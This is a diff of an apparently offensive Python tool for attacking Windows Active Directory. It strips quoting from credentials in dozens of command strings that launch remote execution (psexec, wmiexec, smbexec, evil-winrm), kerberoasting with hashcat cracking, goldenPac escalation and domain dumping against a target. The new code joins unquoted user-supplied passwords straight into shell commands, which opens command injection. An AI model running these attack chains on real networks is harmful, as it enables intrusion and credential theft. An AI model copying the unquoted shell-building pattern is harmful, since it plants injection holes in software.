@@ -133,7 +133,7 @@ def testTwo():
    return 0  
    
 def testThree():
-   if USR[:2] == "''":
+   if USR[:2] == "":
       print("[-] USERNAME has not been specified...")
       return 1
    if SID[:5] == "EMPTY":
@@ -730,8 +730,8 @@ if not os.path.exists(dataDir + "/RA.db"):
    TIP = "EMPTY              " 						                        # REMOTE IP
    POR = "EMPTY              " 						                        # LIVE PORTS
    WEB = "EMPTY              " 						                        # WEB ADDRESS
-   USR = "''                 " 						                        # SESSION USERNAME
-   PAS = "''                 "						                        # SESSION PASSWORD       
+   USR = "\"\"                 " 						                # SESSION USERNAME
+   PAS = "\"\"                 "						                # SESSION PASSWORD       
    NTM = "EMPTY              " 						                        # SESSION HASH
    TGT = "EMPTY              "						                        # SESSION TICKET-NAME
    DOM = "EMPTY              " 						                        # SESSION DOMAIN-NAME
@@ -874,7 +874,7 @@ while True:
             print("[i] Using HASH value as password credential...")
             command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")
          else:
-            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
+            command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'lsaquery' > lsaquery.tmp")     
 
          errorCheck = linecache.getline("lsaquery.tmp", 1)                  
          if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
@@ -931,7 +931,7 @@ while True:
                print("[i] Using HASH value as password credential...")
                command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
             else:
-               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
+               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'netshareenum' > shares.tmp")
                
 # -----
 
@@ -971,7 +971,7 @@ while True:
                print("[i] Using HASH value as password credential...")
                command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
             else:
-               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
+               command("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")
                
 # -----
 
@@ -1147,17 +1147,18 @@ while True:
       USR = input("[*] Please enter username: ")
       if USR == "":
          USR = BAK
-      else:
-         if USR == "''":
-            USR = '""'
-         USR = spacePadding(USR, COL1)
-         NTM = "EMPTY"
-         for x in range(0, maxUser):
-            if USER[x].rstrip(" ") == USR.rstrip(" "):
-               NTM = HASH[x]
-               if NTM[:1] == " ":
-                  NTM = "EMPTY"
-         NTM = spacePadding(NTM, COL1)
+      if USR == "''":
+         USR = "\"\""
+      if USR == "'":
+         USR = "\""
+      USR = spacePadding(USR, COL1)
+      NTM = "EMPTY"
+      for x in range(0, maxUser):
+         if USER[x].rstrip(" ") == USR.rstrip(" "):
+            NTM = HASH[x]
+            if NTM[:1] == " ":
+               NTM = "EMPTY"
+      NTM = spacePadding(NTM, COL1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1172,11 +1173,12 @@ while True:
       PAS = input("[*] Please enter password: ")
       if PAS == "":
          PAS = BAK
-      else:
-         if PAS == "''":
-            PAS = '""'
-         PAS = spacePadding(PAS, COL1)
-         NTM = spacePadding("EMPTY", COL1)
+      if PAS == "''":
+         PAS = "\"\""
+      if PAS == "'":
+         PAS = "\""
+      PAS = spacePadding(PAS, COL1)
+      NTM = spacePadding("EMPTY", COL1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1582,7 +1584,7 @@ while True:
       checkParams = testTwo()
       
       if checkParams != 1:
-         command(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -target " + TIP.rstrip(" "))
+         command(keyPath + "netview.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -target " + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1597,7 +1599,7 @@ while True:
       checkParams = testTwo()
       
       if checkParams != 1:
-         command(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " list")
+         command(keyPath + "services.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " list")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1612,7 +1614,7 @@ while True:
       checkParams = testTwo()
       
       if checkParams != 1:
-         command(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " whoami /all")
+         command(keyPath + "atexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " whoami /all")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1627,7 +1629,7 @@ while True:
       checkParams = testTwo()       
         
       if checkParams != 1:
-         command(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
+         command(keyPath + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " '" + WEB.rstrip(" ") + "'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1642,7 +1644,7 @@ while True:
       checkParams = testTwo()        
        
       if checkParams != 1:
-         command(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
+         command(keyPath + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " -service-name LUALL.exe")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1657,7 +1659,7 @@ while True:
       checkParams = testTwo()      
       
       if checkParams != 1:
-         command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
+         command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1672,7 +1674,7 @@ while True:
       checkParams = testTwo()
       
       if checkParams != 1:
-         command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
+         command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1740,21 +1742,21 @@ while True:
          
       if checkParams != 1:
             print("[*] Enumerating DNS zones...")
-            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -l " + DOM.rstrip(" ") + " --full")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" -l " + DOM.rstrip(" ") + " --full")
             print("\n[*] Enumerating domain admins...")
-            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --da --full")                  
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" --da --full")                  
             print("\n[*] Enumerating admin protected objects...")
-            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --admin-objects --full")                           
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" --admin-objects --full")                           
             print("\n[*] Enumerating domain users...")
-            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U --full")         
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" -U --full")         
             print("\n[*] Enumerating remote management users...")
-            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -U -m 'Remote Management Users' --full")                  
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" -U -m 'Remote Management Users' --full")                  
             print("\n[*] Enumerating users with unconstrained delegation...")
-            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' --unconstrained-users --full")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" --unconstrained-users --full")
             print("\n[*] Enumerating domain groups...")
-            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -G --full")        
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" -G --full")        
             print("\n[*] Enumerating AD computers...")
-            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -C --full")
+            command(keyPath + "windapsearch.py --dc-ip " + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") +" -C --full")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1770,7 +1772,7 @@ while True:
       
       if checkParams != 1:
          print("[*] Enumerating, please wait....")
-         command(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > domain.tmp")                  
+         command(keyPath + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > domain.tmp")                  
          command("cat domain.tmp | grep 'Domain SID' > sid.tmp")         
 
          with open("sid.tmp", "r") as read:
@@ -1857,7 +1859,7 @@ while True:
             command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " > users.tmp")
          else:
             print("")
-            command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > users.tmp")                           
+            command(keyPath + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " > users.tmp")                           
          count = os.path.getsize("users.tmp")   
                
          if count == 0:
@@ -1933,7 +1935,7 @@ while True:
                   command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
                else:
                   if registryKey.lower() != "quit":
-                     command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
+                     command(keyPath + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + TIP.rstrip(" ") + " query -keyName '" + registryKey + "' -s")
                      
       prompt()
             
@@ -2015,7 +2017,7 @@ while True:
             print("[i] Using HASH value as password credential...")
             command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + NTM.rstrip(" ") + " --pw-nt-hash > shares.tmp")
          else:
-            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%'" + PAS.rstrip(" ") + "' > shares.tmp")            
+            command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > shares.tmp")            
          bonusCheck = linecache.getline("shares.tmp", 1)   
                
          if "session setup failed: NT_STATUS_PASSWORD_MUS" in bonusCheck:
@@ -2054,7 +2056,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '42':
-      checkParams = testTwo()  
+      checkParams = testTwo()
           
       if IP46 == "-6":
          print(colored("[!] WARNING!!! - Not compatable with IP 6...",colour0))		# IT MIGHT BE POSSIBLE TO USE DOMAIN NAME BUT NEED REWRITE!!
@@ -2067,7 +2069,7 @@ while True:
             command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
          else:
             print("[*] Checking OS...")
-            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))            
+            command("smbmap -v --admin -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))            
             
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
@@ -2075,7 +2077,7 @@ while True:
             command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
          else:
             print("[*] Checking command privilege...")
-            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
+            command("smbmap -x whoami -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))      
             
          if NTM[:5] != "EMPTY":
             print("[i] Using HASH value as password credential...")
@@ -2083,7 +2085,7 @@ while True:
             command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")      
          else:
             print("[*] Mapping Shares...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")
+            command("smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ")  + " -R " + TSH.rstrip(" ") + " --depth 15")
             
       prompt()
       
@@ -2111,7 +2113,7 @@ while True:
             command("smbmap -u " + USR.rstrip(" ") + " -p :" + NTM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15")
          else:
             print("[+] Downloading any found files...")
-            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
+            command("smbmap -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -A " + exTensions + " -R " + TSH.rstrip(" ") + " --depth 15") 
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2153,7 +2155,7 @@ while True:
             print("[i] Using HASH value as password credential...")
             command(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
          else:
-            command(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
+            command(keyPath + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -dc-ip "  + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2280,7 +2282,7 @@ while True:
             print("[i] Using HASH value as password credential...")
             command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + " -hashes :" + NTM.rstrip(" ") +" -outputfile hashroast1.tmp")
          else:
-            command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.tmp")              
+            command(keyPath + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +" -outputfile hashroast1.tmp")              
             
          print("[*] Cracking hash values if they exists...\n")
          command("hashcat -m 13100 --force -a 0 hashroast1.tmp /usr/share/wordlists/rockyou.txt -o cracked1.txt")
@@ -2524,7 +2526,7 @@ while True:
             print("[i] Using HASH value as password credential...")
             command(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
          else:
-            command(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
+            command(keyPath + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") +"@" + DOM.rstrip(" "))
       prompt()
       
 
@@ -2544,7 +2546,7 @@ while True:
             print("[i] Using HASH value as password credential...")
             command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p :" + NTM.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)
          else:
-            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + workDir)            
+            command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") +" " + TIP.rstrip(" ") + " -o " + workDir)            
          
          print("[*] Checking downloaded files...\n")
          command("ls -la ./" + workDir + "/*.*")
@@ -2592,7 +2594,7 @@ while True:
          BH2 = input("[+] Enter Neo4j password: ")
          
          if BH1 != "" and BH2 != "":
-            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp '" + PAS.rstrip(" ") + "' -s " + TIP.rstrip(" "))
+            command("aclpwn -du " + BH1 + " -dp " + BH2 + " -f " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -d " + DOM.rstrip(" ") + " -sp " + PAS.rstrip(" ") + " -s " + TIP.rstrip(" "))
          else:
             print("[+] Username or password cannot be null...")
             
@@ -3701,9 +3703,9 @@ while True:
                command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H " + NTM.rstrip(" ") + "  -s './" + powrDir + "/' -e './" + httpDir + "/'")
          else:
             if IP46 == "-4":
-               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")            
+               command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -s './" + powrDir + "/' -e './" + httpDir + "/'")            
             else:
-               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s './" + powrDir + "/' -e './" + httpDir + "/'")
+               command("evil-winrm -i " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -s './" + powrDir + "/' -e './" + httpDir + "/'")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -3721,7 +3723,7 @@ while True:
          checkParams = testFour("3389")      
       
       if checkParams != 1:
-         command("xfreerdp /u:" + USR.rstrip(" ") + " /p:'" + PAS.rstrip(" ") + "' /v:" + TIP.rstrip(" "))
+         command("xfreerdp /u:" + USR.rstrip(" ") + " /p:" + PAS.rstrip(" ") + " /v:" + TIP.rstrip(" "))
       prompt()             
                  
 # ------------------------------------------------------------------------------------- 
